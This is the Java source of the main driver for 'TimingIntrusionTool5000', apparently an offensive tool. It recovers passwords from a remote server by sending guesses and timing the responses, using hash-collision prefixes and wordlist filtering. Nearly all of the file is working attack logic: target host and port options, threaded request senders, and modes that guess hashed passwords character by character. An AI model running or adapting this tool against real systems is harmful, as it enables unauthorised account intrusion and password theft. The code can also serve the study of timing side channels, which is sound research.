package timingattack;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.atomic.AtomicInteger;
import timingattack.controllers.AttackController;
import timingattack.controllers.HashController;
import timingattack.controllers.HashTestController;
import timingattack.controllers.PlainTextLengthController;
import timingattack.controllers.PlainTextTestController;

/**
 *
 * @author aj
 */
public class Main {

    private String mode = "testhash";
    private String knownPassword;
    private String requestTemplateFile;
    private String requestTemplate = "";
    private int threads = 1;
    private String hashType = "SHA-1";
    private String origWordlist, newWordlist;
    private String host;
    private int port = -1;
    private int pwdLength = 6;
    private int charsToGuess = 1;
    private HashMap<String, List<Long>> measurements;
    private ArrayBlockingQueue<String> pwdQueue;
    private AtomicInteger requestCount;
    private long startTime;
    private double confidenceRequired = 0.8;

    public Main(String[] args) throws Exception {

        checkKernelTCPLowLatency();

        boolean argsOk = parseArgs(args);
        if (!argsOk)
            return;

        boolean loadOk = loadTemplate();
        if (!loadOk)
            return;

        if (knownPassword != null && pwdLength != knownPassword.length()) {
            pwdLength = knownPassword.length();
            System.out.println("Note: Password length has been set to the same as the known password length: " + pwdLength + " chars.");
        }


        if (threads > 1)
            System.out.println("WARNING: threads set to more than one, this will not work on single threaded servers, and results may be unreliable otherwise.");

        if (confidenceRequired != 0.8)
            System.out.format("Note: Winner confidence requirement set to %.2f\n", confidenceRequired);

        this.pwdQueue = new ArrayBlockingQueue<String>(100, true);
        this.measurements = new HashMap<String, List<Long>>(); //access manually syncronized within the RequestThread
        this.requestCount = new AtomicInteger(0);
        this.startTime = System.currentTimeMillis();

        mode = mode.toLowerCase();

        if (mode.equals("testplaintext"))
            doTestPlain();
        else if (mode.equals("testhash"))
            doTestHash();
        else if (mode.equals("plaintextlength"))
            doPlainTextLength();
        else if (mode.equals("plaintext"))
            doPlainText();
        else if (mode.equals("hash"))
            dohash();
        else {
            System.err.println("Unknown mode: " + mode);
            return;
        }

        long totalTime = System.currentTimeMillis() - startTime;
        int minutes = (int) ((totalTime / (1000 * 60)) % 60);
        int hours = (int) ((totalTime / (1000 * 60 * 60)) % 24);
        System.out.format("Complete in %d hrs, %d mins.\n\n", hours, minutes, requestCount.get());
    }

    private void doTestPlain() throws Exception {

        System.out.println("##Plaintext Test Mode##");

        List<String> pwds;

        if (knownPassword != null)
            pwds = PwdGenerator.getPlainTextWithKnown("abcdefg", pwdLength, knownPassword);
        else
            pwds = PwdGenerator.getPlainText(pwdLength);


        PlainTextTestController controller = new PlainTextTestController(knownPassword, pwds, measurements, requestCount, confidenceRequired);
        runTest(controller, pwds);

    }

    private void doTestHash() throws Exception {

        System.out.println("##Hash Test Mode##");

        if (knownPassword == null) {
            System.out.println("Error: Known password not set.");
            return;
        }

        int prefixLength = 5;

        Hasher hasher = new Hasher(hashType);

        System.out.println("Calulating collisions for first char and adding known password.");
        List<String> pwds = hasher.getCharsCollisionsWithKnown(knownPassword, prefixLength);
        System.out.println("Done.");

        HashTestController controller = new HashTestController(knownPassword, prefixLength, hasher, pwds, measurements, requestCount, confidenceRequired);

        runTest(controller, pwds);
    }

    private void doPlainTextLength() throws Exception {

        System.out.println("##Plaintext Length Test Mode##");
        List<String> pwds = PwdGenerator.getForLength(4, 12);

        PlainTextLengthController controller = new PlainTextLengthController(knownPassword, pwds, measurements, requestCount, confidenceRequired);
        runTest(controller, pwds);
    }

    private void doPlainText() {

        System.out.println("##Plain Text Mode##");
        System.out.println("This feature is unimplemented. So err, bye.");

    }

    private void dohash() throws Exception {

        if (newWordlist == null || origWordlist == null) {
            System.err.println("Need --wordlistNew and --wordlistOrig options, one or both are missing.");
            return;
        }

        System.out.println("##Hash Mode##");

        Hasher hasher = new Hasher(hashType);

        System.out.println("Calulating collisions for first chars.");
        List<String> pwds = hasher.getCharsCollisions();
        System.out.println("Done.");

        WordlistFilter wordlistFilter = null;
        if (origWordlist != null && newWordlist != null)
            wordlistFilter = new WordlistFilter(hashType, origWordlist, newWordlist);

        HashController controller = new HashController(charsToGuess, hashType, wordlistFilter, pwds, measurements, requestCount, confidenceRequired);

        runTest(controller, pwds);
    }

    private void runTest(AttackController controller, List<String> pwds) throws Exception {

        System.out.println("Setup complete, hit the any key to begin.\n?");
        System.in.read();
        System.out.println("Starting...");

        for (int i = 0; i < threads; i++)
            new RequestThread(host, port, requestTemplate, pwdQueue, measurements, requestCount).start();


        while (true) {

            for (String pwd : pwds)
                pwdQueue.put(pwd);

            controller.roundComplete();

            if (controller.isDone())
                break;
        }

        //send end signals
        for (int i = 0; i < threads; i++)
            pwdQueue.put("");
    }

    private void checkKernelTCPLowLatency() {

        File f = new File("/proc/sys/net/ipv4/tcp_low_latency");
        if (!f.exists()) {
            return;
        }

        try {
            Scanner scanner = new Scanner(f);
            int setting = scanner.nextInt();
            if (setting == 0)
                System.out.println("WARNING: Kernel Low Latency TCP setting DISABLED. Set /proc/sys/net/ipv4/tcp_low_latency to 1.");

        } catch (Exception e) {
            //ignore
        }
    }

    private boolean loadTemplate() throws IOException {

        File f = new File(requestTemplateFile);
        if (!f.exists()) {
            System.err.println("Request template (" + requestTemplateFile + ") doesn't exist.");
            return false;
        }

        InputStream input = null;
        try {

            ByteArrayOutputStream requestBytes = new ByteArrayOutputStream();
            input = new FileInputStream(f);

            byte[] buf = new byte[1024];
            int read = 0;
            while ((read = input.read(buf)) > 0)
                requestBytes.write(buf, 0, read);

            requestTemplate = new String(requestBytes.toByteArray(), Charset.forName("UTF-8"));

            if (requestTemplate.trim().length() != requestTemplate.length())
                System.out.println("WARNING: Request template starts or ends with whitespace which can mess up server side hashing. Is this expected?");

            return true;

        } catch (Exception e) {
            System.err.println("Request template (" + requestTemplateFile + ") load fail: " + e.getMessage());
            e.printStackTrace();
            return false;
        } finally {
            if (input != null)
                input.close();
        }

    }

    private boolean parseArgs(String[] args) {

        for (String arg : args) {

            if (arg.startsWith("--threads="))
                threads = Integer.parseInt(arg.split("=")[1]);
            else if (arg.startsWith("--mode="))
                mode = arg.split("=")[1];
            else if (arg.startsWith("--length="))
                pwdLength = Integer.parseInt(arg.split("=")[1]);
            else if (arg.startsWith("--knownPassword="))
                knownPassword = arg.split("=")[1];
            else if (arg.startsWith("--wordlistOrig="))
                origWordlist = arg.split("=")[1];
            else if (arg.startsWith("--wordlistNew="))
                newWordlist = arg.split("=")[1];
            else if (arg.startsWith("--requestTemplate="))
                requestTemplateFile = arg.split("=")[1];
            else if (arg.startsWith("--hash="))
                hashType = arg.split("=")[1];
            else if (arg.startsWith("--host="))
                host = arg.split("=")[1];
            else if (arg.startsWith("--port="))
                port = Integer.parseInt(arg.split("=")[1]);
            else if (arg.startsWith("--charsToGuess="))
                charsToGuess = Integer.parseInt(arg.split("=")[1]);
            else if (arg.startsWith("--confidenceRequired"))
                confidenceRequired = Double.parseDouble(arg.split("=")[1]);
            else
                System.out.println("WARNING: Unknown argument ignored " + arg);

        }

        boolean argsOk = true;
        if (mode == null) {
            System.err.println("Missing --mode option. Should be testplaintext, testhash, plaintextlength, or hash.");
            argsOk = false;
        }
        if (host == null) {
            System.err.println("Missing --host option");
            argsOk = false;
        }
        if (port < 1) {
            System.err.println("Missing or bad --port option");
            argsOk = false;
        }
        if (requestTemplateFile == null) {
            System.err.println("Missing --requestTemplate option.");
            argsOk = false;
        }

        return argsOk;
    }

    public static void main(String[] args) throws Exception {
        new Main(args);
    }
}



/*
 * This file is part of the TimingIntrusionTool5000.
 * 
 * TimingIntrusionTool5000 is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * TimingIntrusionTool5000 is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
 */